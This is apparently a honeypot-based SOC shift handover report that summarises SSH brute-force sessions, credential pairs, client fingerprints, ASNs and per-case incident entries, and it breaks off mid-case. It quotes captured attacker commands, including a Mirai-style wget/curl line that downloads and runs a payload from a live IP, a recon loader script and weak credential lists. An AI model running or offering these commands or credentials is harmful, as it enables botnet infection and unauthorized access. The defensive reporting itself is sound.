# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-19 |
| **Generated At** | 2026-08-19T22:27:56Z |
| **Shift Time** | 22:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **446** |
| Confirmed Threats | **427** |
| False Positives Filtered | **19** (4.3%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **27** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **371** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **15** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `oracle` | 15 |
| `support` | 13 |
| `admin` | 8 |
| `guest` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `abc123` | 6 |
| `support2018` | 5 |
| `supervisor2003` | 5 |
| `nobody2002` | 5 |
| `admin2016` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support2018` | 5 |
| `supervisor` | `supervisor2003` | 5 |
| `nobody` | `nobody2002` | 5 |
| `guest` | `abc123` | 5 |
| `admin` | `admin2016` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `7654321` | `110.173.190.221` | 2026-08-19T18:56:29 |
| `oracle` | `123123` | `85.158.145.129` | 2026-08-19T18:56:33 |
| `oracle` | `123123123` | `85.158.145.129` | 2026-08-19T19:02:30 |
| `admin` | `admin2016` | `10.0.0.73` | 2026-08-19T19:03:56 |
| `oracle` | `1234` | `85.158.145.129` | 2026-08-19T19:08:28 |
| `root` | `654321` | `110.173.190.221` | 2026-08-19T19:09:06 |
| `root` | `admin` | `45.198.224.26` | 2026-08-19T19:09:13 |
| `unknown` | `passw0rd` | `103.83.23.169` | 2026-08-19T19:10:47 |
| `unknown` | `passw0rd` | `117.205.2.250` | 2026-08-19T19:11:01 |
| `oracle` | `12345` | `85.158.145.129` | 2026-08-19T19:14:25 |
| `support` | `support` | `176.53.159.196` | 2026-08-19T19:18:40 |
| `oracle` | `123456` | `85.158.145.129` | 2026-08-19T19:20:22 |
| `admin` | `admin2016` | `111.46.77.2` | 2026-08-19T19:20:50 |
| `admin` | `admin2016` | `196.219.93.98` | 2026-08-19T19:20:59 |
| `root` | `54321` | `110.173.190.221` | 2026-08-19T19:21:49 |
| `oracle` | `1234567` | `85.158.145.129` | 2026-08-19T19:26:19 |
| `support` | `support2018` | `10.0.0.73` | 2026-08-19T19:26:37 |
| `unknown` | `unknown2001` | `120.198.138.185` | 2026-08-19T19:27:06 |
| `unknown` | `unknown2001` | `169.211.232.182` | 2026-08-19T19:27:21 |
| `support` | `support2018` | `59.11.202.38` | 2026-08-19T19:28:14 |
| `support` | `support2018` | `110.25.109.54` | 2026-08-19T19:28:23 |
| `oracle` | `12345678` | `85.158.145.129` | 2026-08-19T19:32:17 |
| `root` | `4321` | `110.173.190.221` | 2026-08-19T19:34:27 |
| `support` | `support2010` | `10.0.0.73` | 2026-08-19T19:37:16 |
| `oracle` | `123456789` | `85.158.145.129` | 2026-08-19T19:38:14 |
| `support` | `support` | `10.0.0.73` | 2026-08-19T19:42:16 |
| `support` | `support2018` | `203.252.10.4` | 2026-08-19T19:43:55 |
| `oracle` | `123456qwerty` | `85.158.145.129` | 2026-08-19T19:44:11 |
| `root` | `321` | `110.173.190.221` | 2026-08-19T19:47:07 |
| `oracle` | `123654` | `85.158.145.129` | 2026-08-19T19:50:08 |
| `support` | `support2010` | `116.48.138.69` | 2026-08-19T19:54:03 |
| `support` | `support2010` | `182.75.197.174` | 2026-08-19T19:54:13 |
| `oracle` | `123oracle` | `85.158.145.129` | 2026-08-19T19:56:05 |
| `supervisor` | `supervisor2003` | `210.4.68.73` | 2026-08-19T19:59:16 |
| `supervisor` | `supervisor2003` | `220.93.167.144` | 2026-08-19T19:59:26 |
| `root` | `0` | `110.173.190.221` | 2026-08-19T19:59:45 |
| `admin` | `admin2005` | `10.0.0.73` | 2026-08-19T19:59:55 |
| `guest` | `guest2021` | `211.228.114.53` | 2026-08-19T20:00:17 |
| `guest` | `guest2021` | `177.174.0.3` | 2026-08-19T20:00:29 |
| `guest` | `guest2021` | `103.121.27.218` | 2026-08-19T20:00:39 |
| `admin` | `admin2005` | `218.26.205.154` | 2026-08-19T20:01:28 |
| `oracle1` | `oracle1` | `85.158.145.129` | 2026-08-19T20:02:03 |
| `oracle2` | `oracle2` | `85.158.145.129` | 2026-08-19T20:08:00 |
| `supervisor` | `supervisor2003` | `10.0.0.73` | 2026-08-19T20:10:42 |
| `root` | `00` | `110.173.190.221` | 2026-08-19T20:12:25 |
| `oracle3` | `oracle3` | `85.158.145.129` | 2026-08-19T20:13:57 |
| `nobody` | `nobody2002` | `10.0.0.73` | 2026-08-19T20:15:33 |
| `admin` | `admin2005` | `218.202.91.147` | 2026-08-19T20:17:14 |
| `admin` | `admin2005` | `112.25.140.211` | 2026-08-19T20:17:24 |
| `oracle4` | `oracle4` | `85.158.145.129` | 2026-08-19T20:19:54 |
| `root` | `000` | `110.173.190.221` | 2026-08-19T20:25:06 |
| `oracle5` | `oracle5` | `85.158.145.129` | 2026-08-19T20:25:51 |
| `supervisor` | `supervisor2003` | `120.234.195.41` | 2026-08-19T20:27:26 |
| `supervisor` | `supervisor2003` | `211.247.127.250` | 2026-08-19T20:27:35 |
| `oracle` | `987654321` | `85.158.145.129` | 2026-08-19T20:31:48 |
| `user` | `user2002` | `117.177.235.249` | 2026-08-19T20:32:39 |
| `user` | `user2002` | `196.188.93.169` | 2026-08-19T20:32:47 |
| `guest` | `abc123` | `10.0.0.73` | 2026-08-19T20:33:03 |
| `nobody` | `nobody2002` | `196.219.75.143` | 2026-08-19T20:33:38 |
| `nobody` | `nobody2002` | `178.178.194.123` | 2026-08-19T20:33:57 |
| `nobody` | `nobody2002` | `85.105.2.51` | 2026-08-19T20:34:04 |
| `guest` | `abc123` | `61.12.86.90` | 2026-08-19T20:34:40 |
| `guest` | `abc123` | `60.174.39.82` | 2026-08-19T20:34:49 |
| `root` | `111111` | `92.118.39.14` | 2026-08-19T20:36:31 |
| `oracle` | `abc123` | `85.158.145.129` | 2026-08-19T20:37:45 |
| `root` | `0000` | `110.173.190.221` | 2026-08-19T20:37:47 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-19T20:38:37 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-19T20:38:37 |
| `root` | `123` | `92.118.39.14` | 2026-08-19T20:39:31 |
| `root` | `123123` | `92.118.39.14` | 2026-08-19T20:42:14 |
| `user` | `user2002` | `10.0.0.73` | 2026-08-19T20:43:41 |
| `oracle` | `@abc123` | `85.158.145.129` | 2026-08-19T20:43:42 |
| `root` | `123321` | `92.118.39.14` | 2026-08-19T20:44:54 |
| `root` | `admin` | `45.84.107.128` | 2026-08-19T20:45:41 |
| `operator` | `operator123456` | `10.0.0.73` | 2026-08-19T20:48:59 |
| `oracle` | `abc123456` | `85.158.145.129` | 2026-08-19T20:49:39 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-19T20:49:48 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-19T20:49:50 |
| `root` | `00000` | `110.173.190.221` | 2026-08-19T20:50:29 |
| `guest` | `abc123` | `219.76.191.29` | 2026-08-19T20:50:32 |
| `root` | `1234` | `92.118.39.14` | 2026-08-19T20:50:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **446** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 38 |
| OpenSSH | 30 |
| libssh | 9 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 29 | 29 |
| `98f63c4d9c87...` | Generic scanner | 20 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 10 | 1 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 29 | 29 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 20 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 10 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 5 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 5 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **55** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9808` | China Mobile Communications Group Co., Ltd. | 6 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1f7eee1bdcb3

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 18:56 |
| **Last Seen** | 2026-08-19 18:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:56:21` | `cowrie.session.connect` |
| `2026-08-19 18:56:22` | `cowrie.client.version` |
| `2026-08-19 18:56:22` | `cowrie.client.kex` |
| `2026-08-19 18:56:29` | `cowrie.login.success` |
| `2026-08-19 18:56:32` | `cowrie.session.params` |
| `2026-08-19 18:56:32` | `cowrie.command.input` |
| `2026-08-19 18:56:35` | `cowrie.log.closed` |
| `2026-08-19 18:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2508578673

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:56 |
| **Last Seen** | 2026-08-19 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:56:33` | `cowrie.session.connect` |
| `2026-08-19 18:56:33` | `cowrie.client.version` |
| `2026-08-19 18:56:33` | `cowrie.client.kex` |
| `2026-08-19 18:56:33` | `cowrie.login.success` |
| `2026-08-19 18:56:34` | `cowrie.session.params` |
| `2026-08-19 18:56:34` | `cowrie.command.input` |
| `2026-08-19 18:56:34` | `cowrie.log.closed` |
| `2026-08-19 18:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99bdc79aa95f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:02 |
| **Last Seen** | 2026-08-19 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:02:30` | `cowrie.session.connect` |
| `2026-08-19 19:02:30` | `cowrie.client.version` |
| `2026-08-19 19:02:30` | `cowrie.client.kex` |
| `2026-08-19 19:02:30` | `cowrie.login.success` |
| `2026-08-19 19:02:31` | `cowrie.session.params` |
| `2026-08-19 19:02:31` | `cowrie.command.input` |
| `2026-08-19 19:02:31` | `cowrie.log.closed` |
| `2026-08-19 19:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b001fb6639b

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:08 |
| **Last Seen** | 2026-08-19 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:08:27` | `cowrie.session.connect` |
| `2026-08-19 19:08:27` | `cowrie.client.version` |
| `2026-08-19 19:08:27` | `cowrie.client.kex` |
| `2026-08-19 19:08:28` | `cowrie.login.success` |
| `2026-08-19 19:08:29` | `cowrie.session.params` |
| `2026-08-19 19:08:29` | `cowrie.command.input` |
| `2026-08-19 19:08:29` | `cowrie.log.closed` |
| `2026-08-19 19:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f22dfab5cb

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 19:08 |
| **Last Seen** | 2026-08-19 19:09 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:08:58` | `cowrie.session.connect` |
| `2026-08-19 19:08:59` | `cowrie.client.version` |
| `2026-08-19 19:08:59` | `cowrie.client.kex` |
| `2026-08-19 19:09:06` | `cowrie.login.success` |
| `2026-08-19 19:09:10` | `cowrie.session.params` |
| `2026-08-19 19:09:10` | `cowrie.command.input` |
| `2026-08-19 19:09:12` | `cowrie.log.closed` |
| `2026-08-19 19:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f046fb30334

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-19 19:09 |
| **Last Seen** | 2026-08-19 19:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:09:12` | `cowrie.session.connect` |
| `2026-08-19 19:09:13` | `cowrie.telnet.option` |
| `2026-08-19 19:09:13` | `cowrie.login.success` |
| `2026-08-19 19:09:13` | `cowrie.session.params` |
| `2026-08-19 19:09:13` | `cowrie.telnet.option` |
| `2026-08-19 19:09:13` | `cowrie.telnet.option` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.failed` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.success` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.failed` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.success` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.failed` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.success` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.command.failed` |
| `2026-08-19 19:09:13` | `cowrie.command.input` |
| `2026-08-19 19:09:13` | `cowrie.log.closed` |
| `2026-08-19 19:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8583547261

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-08-19 19:10 |
| **Last Seen** | 2026-08-19 19:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:10:45` | `cowrie.session.connect` |
| `2026-08-19 19:10:46` | `cowrie.client.version` |
| `2026-08-19 19:10:46` | `cowrie.client.kex` |
| `2026-08-19 19:10:47` | `cowrie.login.success` |
| `2026-08-19 19:10:48` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9976902c5490

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-08-19 19:10 |
| **Last Seen** | 2026-08-19 19:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:10:58` | `cowrie.session.connect` |
| `2026-08-19 19:10:59` | `cowrie.client.version` |
| `2026-08-19 19:10:59` | `cowrie.client.kex` |
| `2026-08-19 19:11:01` | `cowrie.login.success` |
| `2026-08-19 19:11:02` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5c3534178d

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:14 |
| **Last Seen** | 2026-08-19 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:14:24` | `cowrie.session.connect` |
| `2026-08-19 19:14:24` | `cowrie.client.version` |
| `2026-08-19 19:14:24` | `cowrie.client.kex` |
| `2026-08-19 19:14:25` | `cowrie.login.success` |
| `2026-08-19 19:14:25` | `cowrie.session.params` |
| `2026-08-19 19:14:25` | `cowrie.command.input` |
| `2026-08-19 19:14:25` | `cowrie.log.closed` |
| `2026-08-19 19:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06559ea5400

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 19:18 |
| **Last Seen** | 2026-08-19 19:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:18:40` | `cowrie.session.connect` |
| `2026-08-19 19:18:40` | `cowrie.client.version` |
| `2026-08-19 19:18:40` | `cowrie.client.kex` |
| `2026-08-19 19:18:40` | `cowrie.login.success` |
| `2026-08-19 19:18:41` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:18:41` | `cowrie.direct-tcpip.data` |
| `2026-08-19 19:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b103f9841a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:20 |
| **Last Seen** | 2026-08-19 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:20:21` | `cowrie.session.connect` |
| `2026-08-19 19:20:21` | `cowrie.client.version` |
| `2026-08-19 19:20:21` | `cowrie.client.kex` |
| `2026-08-19 19:20:22` | `cowrie.login.success` |
| `2026-08-19 19:20:23` | `cowrie.session.params` |
| `2026-08-19 19:20:23` | `cowrie.command.input` |
| `2026-08-19 19:20:23` | `cowrie.log.closed` |
| `2026-08-19 19:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc7375dc318

| Field | Detail |
|---|---|
| **Source IP** | `111.46.77[.]2` |
| **First Seen** | 2026-08-19 19:20 |
| **Last Seen** | 2026-08-19 19:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:20:47` | `cowrie.session.connect` |
| `2026-08-19 19:20:48` | `cowrie.client.version` |
| `2026-08-19 19:20:48` | `cowrie.client.kex` |
| `2026-08-19 19:20:50` | `cowrie.login.success` |
| `2026-08-19 19:20:51` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.46.77[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.46.77[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da36f59a56ed

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]98` |
| **First Seen** | 2026-08-19 19:20 |
| **Last Seen** | 2026-08-19 19:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:20:57` | `cowrie.session.connect` |
| `2026-08-19 19:20:57` | `cowrie.client.version` |
| `2026-08-19 19:20:57` | `cowrie.client.kex` |
| `2026-08-19 19:20:59` | `cowrie.login.success` |
| `2026-08-19 19:20:59` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]98` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20520a7651a9

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 19:21 |
| **Last Seen** | 2026-08-19 19:21 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:21:40` | `cowrie.session.connect` |
